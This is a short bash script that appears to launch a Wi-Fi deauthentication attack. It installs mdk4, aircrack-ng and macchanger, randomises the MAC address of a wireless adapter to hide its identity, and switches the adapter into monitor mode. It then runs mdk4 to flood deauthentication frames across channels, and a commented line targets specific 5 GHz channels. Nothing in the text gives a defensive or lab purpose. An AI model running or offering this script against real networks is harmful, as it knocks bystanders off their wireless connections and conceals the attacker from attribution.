#!/bin/bash
sudo apt-get -y install mdk4 aircrack-ng macchanger
sudo ip link set wlx488f4cf095b6 down
sudo macchanger -r wlx488f4cf095b6
sudo ip link set wlx488f4cf095b6 up
sudo airmon-ng start wlx488f4cf095b6
sudo mdk4 wlan0mon d -c h -x
#sudo mdk4 wlan0mon d -c 36,40,44,48,149,153,157,161 -x
